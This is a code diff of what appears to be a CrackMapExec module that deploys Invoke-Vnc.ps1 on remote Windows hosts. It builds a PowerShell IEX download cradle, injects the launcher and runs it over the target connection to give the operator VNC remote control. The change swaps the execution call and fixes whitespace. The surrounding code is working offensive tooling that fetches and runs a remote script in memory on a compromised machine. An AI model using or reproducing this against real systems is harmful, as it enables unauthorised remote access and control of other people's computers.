@@ -21,12 +21,12 @@ class CMEModule:
 
         self.contype = 'reverse'
         self.port = 5900
-        self.password = None 
+        self.password = None
 
         if 'PASSWORD' not in module_options:
             context.log.error('PASSWORD option is required!')
             exit(1)
-        
+
         if 'CONTYPE' in module_options:
             self.contype    =  module_options['CONTYPE']
 
@@ -47,9 +47,8 @@ class CMEModule:
         vnc_command = gen_ps_iex_cradle(context, 'Invoke-Vnc.ps1', command, post_back=False)
 
         launcher = gen_ps_inject(vnc_command, context)
-        ps_command = create_ps_command(launcher)
 
-        connection.execute(ps_command)
+        connection.ps_execute(launcher)
         context.log.success('Executed launcher')
 
     def on_request(self, context, request):
